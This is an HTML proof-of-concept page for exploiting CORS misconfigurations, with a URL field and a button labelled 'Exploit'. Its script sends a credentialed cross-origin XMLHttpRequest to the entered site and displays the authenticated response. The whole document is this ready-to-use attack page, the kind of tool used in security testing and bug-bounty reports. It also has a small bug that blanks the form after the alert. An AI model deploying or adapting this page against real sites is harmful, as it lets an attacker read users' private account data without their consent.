<!DOCTYPE html>
<html>
     <head>
         <meta charset="utf-8">
         <meta name="referrer" content="no-referrer">
         <title>CORS PoC</title>
         <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
         <style>
             body {
                 margin: 20px;
             }
             h2 {
                 margin-bottom: 20px;
             }
             form {
                 max-width: 400px;
                 margin: 0 auto;
             }
             .bg-color {
               background-color: rgba(93,159,23,255) !important;
             }
         </style>
     </head>
     <body class="bg-color">
         <h2>CORS PoC</h2>
         <div id="demo" class="container-fluid">
             <form class="form-inline">
                 <label for="url" class="sr-only">Enter website URL:</label>
                 <input type="text" id="url" name="url" class="form-control mb-2 mr-sm-2">
                 <button type="button" onclick="cors()" class="btn btn-primary mb-2">Exploit</button>
             </form>
         </div>
         <script>
             function cors() {
             var xhr = new XMLHttpRequest();
             xhr.onreadystatechange = function() {
                 if (this.readyState == 4 && this.status == 200) {
                 document.getElementById("demo").innerHTML = alert(this.responseText);
                 }
             };
              xhr.open("GET",
                       document.getElementById("url").value, true);
             xhr.withCredentials = true;
             xhr.send();
             }
         </script>
     </body>
 </html>
